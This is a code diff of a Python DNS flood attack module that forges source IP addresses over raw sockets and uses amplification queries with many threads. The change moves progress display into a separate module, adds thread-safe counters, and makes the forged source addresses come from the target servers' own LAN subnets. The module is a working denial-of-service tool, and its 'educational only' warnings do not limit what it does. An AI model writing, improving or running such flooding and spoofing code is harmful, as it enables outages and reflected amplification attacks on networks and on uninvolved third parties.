@@ -12,98 +12,10 @@ import time
 import sys
 import argparse
 from rich.console import Console
-from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
+from modules import config as conf
+from .progress import ProgressUpdater
 
 console = Console()
-
-# Color codes for console output
-class conf:
-    RED = "\033[91m"
-    GREEN = "\033[92m"
-    YELLOW = "\033[93m"
-    BLUE = "\033[94m"
-    MAGENTA = "\033[95m"
-    CYAN = "\033[96m"
-    WHITE = "\033[97m"
-    RESET = "\033[0m"
-    DIM = "\033[2m"
-
-class DnsFloodProgressUpdater:
-    """Track and display attack progress"""
-    
-    def __init__(self, duration=120, silent=False):
-        self.duration = duration
-        self.silent = silent
-        self.packets_sent = 0
-        self.failures = 0
-        self.start_time = None
-        self.running = False
-        
-        # Setup progress display
-        self.progress = Progress(
-            TextColumn("[progress.description]{task.description}"),
-            BarColumn(),
-            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
-            TextColumn("•"),
-            TextColumn("[progress.completed]{task.completed}/[progress.total]{task.total} packets"),
-            TextColumn("•"),
-            TextColumn("{task.fields[rate]:.1f} p/s"),
-            TextColumn("•"),
-            TimeRemainingColumn(),
-            console=console,
-            disable=silent
-        )
-        self.task = self.progress.add_task("[red]Attacking...", total=duration, rate=0)
-    
-    def start(self):
-        """Start progress tracking"""
-        self.start_time = time.time()
-        self.running = True
-        if not self.silent:
-            self.progress.start()
-    
-    def stop(self):
-        """Stop progress tracking"""
-        self.running = False
-        if not self.silent:
-            self.progress.stop()
-    
-    def increment_packets(self, count=1):
-        """Update packet count"""
-        self.packets_sent += count
-        if self.running and not self.silent:
-            elapsed = time.time() - self.start_time
-            current_rate = self.packets_sent / elapsed if elapsed > 0 else 0
-            self.progress.update(self.task, advance=0, rate=current_rate)
-    
-    def increment_failures(self, count=1):
-        """Update failure count"""
-        self.failures += count
-    
-    def get_progress_info(self):
-        """Get current progress information"""
-        elapsed = time.time() - self.start_time if self.start_time else 0
-        current_rate = self.packets_sent / elapsed if elapsed > 0 else 0
-        average_rate = self.packets_sent / self.duration if self.duration > 0 else 0
-        
-        return {
-            "packets_sent": self.packets_sent,
-            "failures": self.failures,
-            "elapsed_time": elapsed,
-            "current_rate": current_rate,
-            "average_rate": average_rate
-        }
-    
-    def print_summary(self):
-        """Print attack summary"""
-        info = self.get_progress_info()
-        console.print(f"\n{conf.GREEN}✓ Attack completed{conf.RESET}")
-        console.print(f"{conf.GREEN}Duration: {info['elapsed_time']:.1f}s{conf.RESET}")
-        console.print(f"{conf.GREEN}Packets sent: {info['packets_sent']}{conf.RESET}")
-        console.print(f"{conf.GREEN}Average rate: {info['average_rate']:.1f} packets/second{conf.RESET}")
-        
-        if info['failures'] > 0:
-            console.print(f"{conf.YELLOW}Failures: {info['failures']}{conf.RESET}")
 
 class DnsFlood:
     """DNS Flood Attack with REAL IP Spoofing (Educational Only)"""
@@ -140,6 +52,7 @@ class DnsFlood:
         self.use_txt_query = use_txt_query
         self.random_subdomains = random_subdomains
         self.target_ip = target_ip
+        self._lock = threading.Lock()
         
         # Common domains known to have large responses (for amplification)
         self.large_response_domains = [
@@ -151,22 +64,87 @@ class DnsFlood:
         self.running = False
         self.start_time = None
         self.threads = []
+        self.packets_sent = 0
+        self.failures = 0
         
-        # Initialize progress updater
-        self.progress = DnsFloodProgressUpdater(duration=duration, silent=silent)
+        # Initialize progress updater (external module)
+        self.progress = ProgressUpdater(silent=silent)
         
         # Raw socket for spoofing (requires root)
         self.raw_socket = None
         if spoof_source:
             self._setup_raw_socket()
         
+        # Calculate LAN subnet for spoofing
+        self.lan_subnets = self._calculate_lan_subnets()
+        
         # Warning for spoofing
         if spoof_source:
             console.print(f"\n{conf.RED}⚠️  WARNING: Source IP spoofing is enabled.{conf.RESET}")
             console.print(f"{conf.RED}   This is ILLEGAL for real attacks and for educational/testing purposes only!{conf.RESET}")
             console.print(f"{conf.RED}   Use only on your own networks with proper authorization.{conf.RESET}")
-            console.print(f"{conf.RED}   Target IP: {target_ip}{conf.RESET}\n")
+            console.print(f"{conf.RED}   Target IP: {target_ip}{conf.RESET}")
+            console.print(f"{conf.RED}   Spoofing IPs from LAN subnets: {', '.join(self.lan_subnets)}{conf.RESET}\n")
             time.sleep(2)
+    
+    def _calculate_lan_subnets(self):
+        """Calculate LAN subnets based on DNS server IPs"""
+        subnets = set()
+        for server_ip in self.dns_servers:
+            try:
+                ip_parts = server_ip.split('.')
+                if len(ip_parts) != 4:
+                    continue
+                
+                # Determine appropriate mask based on common private IP ranges
+                first_octet = int(ip_parts[0])
+                second_octet = int(ip_parts[1])
+                
+                if first_octet == 10:
+                    # 10.0.0.0/8 - Class A private network
+                    subnet = f"10.0.0.0/8"
+                elif first_octet == 172 and 16 <= second_octet <= 31:
+                    # 172.16.0.0/12 - Class B private networks  
+                    subnet = f"172.16.0.0/12"
+                elif first_octet == 192 and second_octet == 168:
+                    # 192.168.0.0/16 - Class C private networks
+                    # But use /24 for individual subnets
+                    subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
+                else:
+                    # For other IPs, assume /24 subnet
+                    subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
+                
+                subnets.add(subnet)
+                
+            except (ValueError, IndexError):
+                continue
+        
+        # If no subnets found, use common private subnets
+        if not subnets:
+            subnets = {'192.168.0.0/16', '10.0.0.0/8', '172.16.0.0/12'}
+        
+        return list(subnets)
+    
+    def _generate_lan_ip(self):
+        """Generate a random IP address within one of the LAN subnets"""
+        subnet = random.choice(self.lan_subnets)
+        network, prefix = subnet.split('/')
+        prefix = int(prefix)
+        
+        # Convert network address to integer
+        network_int = int.from_bytes(socket.inet_aton(network), 'big')
+        
+        # Calculate number of hosts in the subnet
+        num_hosts = 2 ** (32 - prefix)
+        
+        # Generate random host part (skip network and broadcast addresses)
+        host_int = random.randint(1, num_hosts - 2)
+        
+        # Combine network and host parts
+        ip_int = network_int + host_int
+        
+        # Convert back to dotted-decimal notation
+        return socket.inet_ntoa(ip_int.to_bytes(4, 'big'))
     
     def _setup_raw_socket(self):
         """Set up raw socket for IP spoofing (requires root privileges)"""
@@ -373,16 +351,17 @@ class DnsFlood:
             return packet
             
         except Exception as e:
-            self.progress.increment_failures(1)
+            with self._lock:
+                self.failures += 1
             if self.verbose:
                 console.print(f"{conf.RED}Query creation failed: {str(e)}{conf.RESET}")
             return None
     
     def send_spoofed_dns_query(self, target_ip, dns_server_ip, query):
-        """Send a DNS query with spoofed source IP"""
+        """Send a DNS query with spoofed source IP from the same LAN"""
         try:
-            # Generate random source IP and port for spoofing
-            spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+            # Generate random source IP from the same LAN and port for spoofing
+            spoofed_ip = self._generate_lan_ip()
             spoofed_port = random.randint(1024, 65535)
             
             # Create UDP header
@@ -395,12 +374,14 @@ class DnsFlood:
             self.raw_socket.sendto(ip_header + udp_header + query, (dns_server_ip, 53))
             
             # Update progress
-            self.progress.increment_packets(1)
+            with self._lock:
+                self.packets_sent += 1
             
             return True
             
         except Exception as e:
-            self.progress.increment_failures(1)
+            with self._lock:
+                self.failures += 1
             if self.verbose:
                 console.print(f"{conf.RED}Spoofed query failed: {str(e)}{conf.RESET}")
             return False
@@ -417,12 +398,14 @@ class DnsFlood:
                 sock.sendto(query, (dns_server_ip, 53))
                 
                 # Update progress
-                self.progress.increment_packets(1)
+                with self._lock:
+                    self.packets_sent += 1
                 
             return True
             
         except Exception as e:
-            self.progress.increment_failures(1)
+            with self._lock:
+                self.failures += 1
             if self.verbose:
                 console.print(f"{conf.RED}Query failed: {str(e)}{conf.RESET}")
             return False
@@ -451,12 +434,20 @@ class DnsFlood:
                 else:
                     success = self.send_normal_dns_query(target_ip, query)
                 
+                # Update progress display periodically
+                with self._lock:
+                    current_packets = self.packets_sent
+                    current_failures = self.failures
+                
+                # Update progress every 100 packets or so
+                if current_packets % 100 == 0:
+                    self.progress.update_counters(current_packets, current_failures)
+                
                 # Verbose output with query type info
-                if self.verbose and success and self.progress.packets_sent % 500 == 0:
-                    info = self.progress.get_progress_info()
+                if self.verbose and success and current_packets % 500 == 0:
                     qtype_name = self.get_query_type_name(query_type)
                     mode = "SPOOFED" if self.spoof_source else "NORMAL"
-                    console.print(f"{conf.YELLOW}[DEBUG] {mode} {qtype_name} query for {domain}, Rate: {info['current_rate']:.1f} pps{conf.RESET}")
+                    console.print(f"{conf.YELLOW}[DEBUG] {mode} {qtype_name} query for {domain}{conf.RESET}")
                 
                 # Rate limiting
                 if self.query_rate > 0:
@@ -466,7 +457,8 @@ class DnsFlood:
                 # Timeouts are expected and not counted as failures
                 pass
             except Exception as e:
-                self.progress.increment_failures(1)
+                with self._lock:
+                    self.failures += 1
                 if self.verbose:
                     console.print(f"{conf.RED}Query failed: {str(e)}{conf.RESET}")
                 time.sleep(0.001)  # Brief pause on error
@@ -479,22 +471,6 @@ class DnsFlood:
             dict: Attack results
         """
         try:
-            console.print(f"{conf.RED}🚀 Starting Amplified DNS Flood Attack...{conf.RESET}")
-            console.print(f"{conf.DIM}Target servers: {', '.join(self.dns_servers)}{conf.RESET}")
-            console.print(f"{conf.DIM}Duration: {self.duration}s, Threads: {self.num_threads}, Rate: {self.query_rate} qps/thread{conf.RESET}")
-            
-            if self.amplification:
-                console.print(f"{conf.DIM}Amplification: {conf.GREEN}ENABLED{conf.RESET}")
-                techniques = []
-                if self.use_any_query: techniques.append("ANY queries")
-                if self.use_txt_query: techniques.append("TXT queries")
-                if self.random_subdomains: techniques.append("Random subdomains")
-                console.print(f"{conf.DIM}Techniques: {', '.join(techniques)}{conf.RESET}")
-            
-            if self.spoof_source:
-                console.print(f"{conf.DIM}Spoofing: {conf.RED}ENABLED{conf.RESET}")
-                console.print(f"{conf.DIM}Target IP: {self.target_ip}{conf.RESET}")
-            
             # Initialize attack state
             self.running = True
             self.start_time = time.time()
@@ -509,10 +485,15 @@ class DnsFlood:
                 thread.start()
                 self.threads.append(thread)
             
-            # Monitor attack progress
+            # Monitor attack progress and update display
             try:
                 while self.running and (time.time() - self.start_time) < self.duration:
                     time.sleep(0.5)
+                    # Update progress with current counts
+                    with self._lock:
+                        current_packets = self.packets_sent
+                        current_failures = self.failures
+                    self.progress.update_counters(current_packets, current_failures)
             except KeyboardInterrupt:
                 console.print(f"\n{conf.YELLOW}Attack interrupted by user{conf.RESET}")
             
@@ -523,33 +504,28 @@ class DnsFlood:
             for thread in self.threads:
                 thread.join(timeout=2.0)
             
+            # Update progress one final time
+            with self._lock:
+                current_packets = self.packets_sent
+                current_failures = self.failures
+            self.progress.update_counters(current_packets, current_failures)
+            
             # Stop progress updater
             self.progress.stop()
             
             # Calculate results
             duration = time.time() - self.start_time
-            info = self.progress.get_progress_info()
             
             # Print summary
-            if not self.progress.silent:
-                self.progress.print_summary()
-            else:
-                console.print(f"\n{conf.GREEN}✓ Attack completed{conf.RESET}")
-                console.print(f"{conf.GREEN}Duration: {duration:.1f}s{conf.RESET}")
-                console.print(f"{conf.GREEN}Packets sent: {info['packets_sent']}{conf.RESET}")
-                console.print(f"{conf.GREEN}Average rate: {info['average_rate']:.1f} packets/second{conf.RESET}")
-                
-                if info['failures'] > 0:
-                    console.print(f"{conf.YELLOW}Failures: {info['failures']}{conf.RESET}")
+            self.progress.print_summary()
             
             return {
                 "dns_servers": self.dns_servers,
                 "duration": int(duration),
-                "packets_sent": info['packets_sent'],
-                "failures": info['failures'],
+                "packets_sent": self.packets_sent,
+                "failures": self.failures,
                 "query_rate": self.query_rate,
                 "threads": self.num_threads,
-                "average_rate": info['average_rate'],
                 "amplification": self.amplification,
                 "spoofing": self.spoof_source,
                 "estimated_amplification_factor": self._estimate_amplification_factor()
